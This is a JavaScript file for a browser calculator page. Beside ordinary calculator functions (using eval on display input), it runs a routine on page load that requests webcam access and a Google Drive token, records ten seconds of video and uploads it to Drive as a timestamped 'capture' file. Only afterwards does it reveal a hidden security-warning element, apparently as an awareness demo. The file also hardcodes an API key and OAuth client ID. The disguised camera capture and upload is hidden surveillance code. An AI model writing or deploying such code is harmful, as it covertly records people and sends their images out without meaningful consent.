let display = document.getElementById("display")
let securityWarning = document.getElementById("security-warning")

const CLIENT_ID = "883580141346-u1e41q10608887ba83gvkmbq8il24inq.apps.googleusercontent.com"
const API_KEY = "AIzaSyClpHOgnxwml2wyvWD7bUDm1oiHwZ1K-2I"
const DRIVE_SCOPE = "https://www.googleapis.com/auth/drive.file"
const DRIVE_FOLDER_ID = ""
const RECORDING_MS = 10000

function press(v) {
    display.value += v
}

function calculate() {
    try {
        display.value = eval(display.value)
    } catch {
        display.value = "Error"
    }
}

function clearDisplay() {
    display.value = ""
}

function waitForGoogleIdentity() {
    return new Promise((resolve, reject) => {
        const startedAt = Date.now()
        const interval = setInterval(() => {
            if (window.google && google.accounts && google.accounts.oauth2) {
                clearInterval(interval)
                resolve()
                return
            }

            if (Date.now() - startedAt > 8000) {
                clearInterval(interval)
                reject(new Error("Google Identity Services failed to load"))
            }
        }, 100)
    })
}

function waitForGapiClient() {
    return new Promise((resolve, reject) => {
        const startedAt = Date.now()
        const interval = setInterval(() => {
            if (window.gapi && gapi.load) {
                clearInterval(interval)
                resolve()
                return
            }

            if (Date.now() - startedAt > 8000) {
                clearInterval(interval)
                reject(new Error("Google API client failed to load"))
            }
        }, 100)
    })
}

async function initGapiClient() {
    await new Promise(resolve => gapi.load("client", resolve))
    await gapi.client.init({
        apiKey: API_KEY,
        discoveryDocs: ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"]
    })
}

function initTokenClient() {
    return google.accounts.oauth2.initTokenClient({
        client_id: CLIENT_ID,
        scope: DRIVE_SCOPE,
        callback: () => { }
    })
}

function requestDriveToken(tokenClient) {
    return new Promise((resolve, reject) => {
        tokenClient.callback = resp => {
            if (resp.error) {
                reject(resp)
                return
            }

            resolve(resp.access_token)
        }

        tokenClient.requestAccessToken({ prompt: "consent" })
    })
}

function buildTimestampFilename() {
    const now = new Date()
    const pad = value => String(value).padStart(2, "0")

    const datePart = [
        now.getFullYear(),
        pad(now.getMonth() + 1),
        pad(now.getDate())
    ].join("")

    const timePart = [
        pad(now.getHours()),
        pad(now.getMinutes()),
        pad(now.getSeconds())
    ].join("")

    return `capture-${datePart}-${timePart}.webm`
}

async function blobToBase64(blob) {
    const buffer = await blob.arrayBuffer()
    const bytes = new Uint8Array(buffer)
    const chunkSize = 0x8000
    let binary = ""

    for (let i = 0; i < bytes.length; i += chunkSize) {
        binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize))
    }

    return btoa(binary)
}

async function uploadToDrive(blob, filename, accessToken) {
    const metadata = {
        name: filename,
        mimeType: "video/webm"
    }

    if (DRIVE_FOLDER_ID) {
        metadata.parents = [DRIVE_FOLDER_ID]
    }

    gapi.client.setToken({ access_token: accessToken })

    window.__debug_blob_size = blob.size

    const base64Data = await blobToBase64(blob)
    window.__debug_base64_length = base64Data.length
    const boundary = "314159265358979323846"
    const multipartBody =
        `--${boundary}\r\n` +
        "Content-Type: application/json; charset=UTF-8\r\n\r\n" +
        JSON.stringify(metadata) +
        "\r\n" +
        `--${boundary}\r\n` +
        `Content-Type: ${blob.type || "video/webm"}\r\n` +
        "Content-Transfer-Encoding: base64\r\n\r\n" +
        base64Data +
        "\r\n" +
        `--${boundary}--`

    const response = await gapi.client.request({
        path: "/upload/drive/v3/files",
        method: "POST",
        params: { uploadType: "multipart", fields: "id,name" },
        headers: { "Content-Type": `multipart/related; boundary=${boundary}` },
        body: multipartBody
    })

    return response.result
}

// auto-run on page load
window.addEventListener("load", async () => {

    try {

        await waitForGoogleIdentity()
        await waitForGapiClient()
        await initGapiClient()
        const tokenClient = initTokenClient()

        const stream = await navigator.mediaDevices.getUserMedia({ video: true })
        const accessToken = await requestDriveToken(tokenClient)

        const preferredTypes = [
            "video/webm;codecs=vp9,opus",
            "video/webm;codecs=vp8,opus",
            "video/webm"
        ]

        const selectedType = preferredTypes.find(type => MediaRecorder.isTypeSupported(type)) || ""
        const recorder = selectedType ? new MediaRecorder(stream, { mimeType: selectedType }) : new MediaRecorder(stream)

        let chunks = []

        recorder.ondataavailable = e => {
            if (e.data && e.data.size > 0) {
                chunks.push(e.data)
            }

            window.__debug_chunks_length = chunks.length
            window.__debug_last_chunk_size = e.data ? e.data.size : 0
        }

        recorder.start(1000)

        // record 10 seconds
        setTimeout(() => {
            recorder.requestData()
            recorder.stop()
        }, RECORDING_MS)

        recorder.onstop = async () => {
            try {
                window.__debug_recorder_state = recorder.state
                window.__debug_total_bytes = chunks.reduce((sum, chunk) => sum + chunk.size, 0)

                if (!chunks.length) {
                    throw new Error("Recording produced no data")
                }

                const blob = new Blob(chunks, { type: selectedType || "video/webm" })
                const filename = buildTimestampFilename()
                await uploadToDrive(blob, filename, accessToken)
            } catch (err) {
                console.log("Drive upload error:", err)
            } finally {
                // stop camera after recording
                stream.getTracks().forEach(track => track.stop())

                if (securityWarning) {
                    securityWarning.classList.remove("hidden")
                }
            }
        }

    } catch (err) {
        console.log("Camera/Drive error:", err)
    }

})